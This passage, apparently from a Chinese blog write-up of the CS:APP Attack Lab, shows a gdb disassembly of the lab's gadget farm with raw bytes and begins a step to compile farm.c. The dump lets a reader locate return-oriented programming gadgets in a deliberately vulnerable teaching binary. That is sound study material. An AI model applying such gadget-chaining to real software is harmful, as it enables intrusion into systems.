style=--0:#9ECBFF>c0</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x3f7b3d77(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>57</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a46</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_487+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>58</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a47</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_201+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>e0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x381f76b8(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>59</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a4d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_201+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>60</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a4e</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_272+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>99</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d1</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>08</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d2</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0xd208d199</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>61</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a53</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_272+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>62</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a54</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_155+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c4</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c9</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0xc9c4c289</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>63</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a59</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_155+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>64</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a5a</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_299+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>e0</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>91</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0x91e08948</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>65</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a60</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_299+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>66</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a61</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_404+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ce</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>92</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x3c6d3177(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>67</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a67</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_404+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>68</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a68</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_311+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d1</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>08</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>db</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0xdb08d189</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>69</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a6d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_311+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>70</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a6e</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_167+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d1</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>91</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0xc391d189</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>71</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a74</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_167+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>72</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a75</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_328+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>81</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>38</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d2</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0xd238c281</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>73</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a7b</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_328+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>74</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a7c</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_450+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>09</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ce</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>08</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c9</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0xc908ce09</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>75</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a82</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_450+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>76</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a83</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_358+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>08</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>e0</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x6f1f76f8(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>77</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_358+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>78</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a8a</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_124+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>3c</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>0x3cc7c289</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>79</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a90</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_124+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>80</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a91</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_169+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>88</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ce</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>20</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c0</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0xc020ce88</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>81</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a96</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_169+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>82</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a97</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_181+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>e0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0xc2e08948</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>83</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a9d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_181+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>84</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401a9e</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_184+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>60</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d2</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x2d9f3d77(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>85</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401aa4</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_184+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>86</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401aa5</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_472+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ce</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>20</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d2</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0xd220ce8d</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>87</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401aaa</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_472+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>88</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401aab</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_350+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>07</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>e0</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0x90e08948</span><span style=--0:#9ECBFF>,</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rdi</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>89</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401ab1</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;setval_350+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>90</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401ab2</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;end_farm+0>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>01</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x1</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>91</div></div><div class=code><span style=--0:#B392F0>End</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>dump.</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="(gdb) disass /r 0x401994,0x401ab7Dump of assembler code from 0x401994 to 0x401ab7:   0x0000000000401994 <start_farm+0>:   b8 01 00 00 00          mov    $0x1,%eax   0x0000000000401999 <start_farm+5>:   c3                      ret   0x000000000040199a <getval_142+0>:   b8 fb 78 90 90          mov    $0x909078fb,%eax   0x000000000040199f <getval_142+5>:   c3                      ret   0x00000000004019a0 <addval_273+0>:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax   0x00000000004019a6 <addval_273+6>:   c3                      ret   0x00000000004019a7 <addval_219+0>:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax   0x00000000004019ad <addval_219+6>:   c3                      ret   0x00000000004019ae <setval_237+0>:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)   0x00000000004019b4 <setval_237+6>:   c3                      ret   0x00000000004019b5 <setval_424+0>:   c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)   0x00000000004019bb <setval_424+6>:   c3                      ret   0x00000000004019bc <setval_470+0>:   c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)   0x00000000004019c2 <setval_470+6>:   c3                      ret   0x00000000004019c3 <setval_426+0>:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)   0x00000000004019c9 <setval_426+6>:   c3                      ret   0x00000000004019ca <getval_280+0>:   b8 29 58 90 c3          mov    $0xc3905829,%eax   0x00000000004019cf <getval_280+5>:   c3                      ret   0x00000000004019d0 <mid_farm+0>:     b8 01 00 00 00          mov    $0x1,%eax   0x00000000004019d5 <mid_farm+5>:     c3                      ret   0x00000000004019d6 <add_xy+0>:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax   0x00000000004019da <add_xy+4>:       c3                      ret   0x00000000004019db <getval_481+0>:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax   0x00000000004019e0 <getval_481+5>:   c3                      ret   0x00000000004019e1 <setval_296+0>:   c7 07 99 d1 90 90       movl   $0x9090d199,(%rdi)   0x00000000004019e7 <setval_296+6>:   c3                      ret   0x00000000004019e8 <addval_113+0>:   8d 87 89 ce 78 c9       lea    -0x36873177(%rdi),%eax   0x00000000004019ee <addval_113+6>:   c3                      ret--Type <RET> for more, q to quit, c to continue without paging--c   0x00000000004019ef <addval_490+0>:   8d 87 8d d1 20 db       lea    -0x24df2e73(%rdi),%eax   0x00000000004019f5 <addval_490+6>:   c3                      ret   0x00000000004019f6 <getval_226+0>:   b8 89 d1 48 c0          mov    $0xc048d189,%eax   0x00000000004019fb <getval_226+5>:   c3                      ret   0x00000000004019fc <setval_384+0>:   c7 07 81 d1 84 c0       movl   $0xc084d181,(%rdi)   0x0000000000401a02 <setval_384+6>:   c3                      ret   0x0000000000401a03 <addval_190+0>:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax   0x0000000000401a09 <addval_190+6>:   c3                      ret   0x0000000000401a0a <setval_276+0>:   c7 07 88 c2 08 c9       movl   $0xc908c288,(%rdi)   0x0000000000401a10 <setval_276+6>:   c3                      ret   0x0000000000401a11 <addval_436+0>:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax   0x0000000000401a17 <addval_436+6>:   c3                      ret   0x0000000000401a18 <getval_345+0>:   b8 48 89 e0 c1          mov    $0xc1e08948,%eax   0x0000000000401a1d <getval_345+5>:   c3                      ret   0x0000000000401a1e <addval_479+0>:   8d 87 89 c2 00 c9       lea    -0x36ff3d77(%rdi),%eax   0x0000000000401a24 <addval_479+6>:   c3                      ret   0x0000000000401a25 <addval_187+0>:   8d 87 89 ce 38 c0       lea    -0x3fc73177(%rdi),%eax   0x0000000000401a2b <addval_187+6>:   c3                      ret   0x0000000000401a2c <setval_248+0>:   c7 07 81 ce 08 db       movl   $0xdb08ce81,(%rdi)   0x0000000000401a32 <setval_248+6>:   c3                      ret   0x0000000000401a33 <getval_159+0>:   b8 89 d1 38 c9          mov    $0xc938d189,%eax   0x0000000000401a38 <getval_159+5>:   c3                      ret   0x0000000000401a39 <addval_110+0>:   8d 87 c8 89 e0 c3       lea    -0x3c1f7638(%rdi),%eax   0x0000000000401a3f <addval_110+6>:   c3                      ret   0x0000000000401a40 <addval_487+0>:   8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax   0x0000000000401a46 <addval_487+6>:   c3                      ret   0x0000000000401a47 <addval_201+0>:   8d 87 48 89 e0 c7       lea    -0x381f76b8(%rdi),%eax   0x0000000000401a4d <addval_201+6>:   c3                      ret   0x0000000000401a4e <getval_272+0>:   b8 99 d1 08 d2          mov    $0xd208d199,%eax   0x0000000000401a53 <getval_272+5>:   c3                      ret   0x0000000000401a54 <getval_155+0>:   b8 89 c2 c4 c9          mov    $0xc9c4c289,%eax   0x0000000000401a59 <getval_155+5>:   c3                      ret   0x0000000000401a5a <setval_299+0>:   c7 07 48 89 e0 91       movl   $0x91e08948,(%rdi)   0x0000000000401a60 <setval_299+6>:   c3                      ret   0x0000000000401a61 <addval_404+0>:   8d 87 89 ce 92 c3       lea    -0x3c6d3177(%rdi),%eax   0x0000000000401a67 <addval_404+6>:   c3                      ret   0x0000000000401a68 <getval_311+0>:   b8 89 d1 08 db          mov    $0xdb08d189,%eax   0x0000000000401a6d <getval_311+5>:   c3                      ret   0x0000000000401a6e <setval_167+0>:   c7 07 89 d1 91 c3       movl   $0xc391d189,(%rdi)   0x0000000000401a74 <setval_167+6>:   c3                      ret   0x0000000000401a75 <setval_328+0>:   c7 07 81 c2 38 d2       movl   $0xd238c281,(%rdi)   0x0000000000401a7b <setval_328+6>:   c3                      ret   0x0000000000401a7c <setval_450+0>:   c7 07 09 ce 08 c9       movl   $0xc908ce09,(%rdi)   0x0000000000401a82 <setval_450+6>:   c3                      ret   0x0000000000401a83 <addval_358+0>:   8d 87 08 89 e0 90       lea    -0x6f1f76f8(%rdi),%eax   0x0000000000401a89 <addval_358+6>:   c3                      ret   0x0000000000401a8a <addval_124+0>:   8d 87 89 c2 c7 3c       lea    0x3cc7c289(%rdi),%eax   0x0000000000401a90 <addval_124+6>:   c3                      ret   0x0000000000401a91 <getval_169+0>:   b8 88 ce 20 c0          mov    $0xc020ce88,%eax   0x0000000000401a96 <getval_169+5>:   c3                      ret   0x0000000000401a97 <setval_181+0>:   c7 07 48 89 e0 c2       movl   $0xc2e08948,(%rdi)   0x0000000000401a9d <setval_181+6>:   c3                      ret   0x0000000000401a9e <addval_184+0>:   8d 87 89 c2 60 d2       lea    -0x2d9f3d77(%rdi),%eax   0x0000000000401aa4 <addval_184+6>:   c3                      ret   0x0000000000401aa5 <getval_472+0>:   b8 8d ce 20 d2          mov    $0xd220ce8d,%eax   0x0000000000401aaa <getval_472+5>:   c3                      ret   0x0000000000401aab <setval_350+0>:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)   0x0000000000401ab1 <setval_350+6>:   c3                      ret   0x0000000000401ab2 <end_farm+0>:     b8 01 00 00 00          mov    $0x1,%eaxEnd of assembler dump." data-copied=Copied!><div></div></button></div></figure></div><p>或者,利用提供的farm.c文件:</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>gcc</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-c</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>farm.c</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span 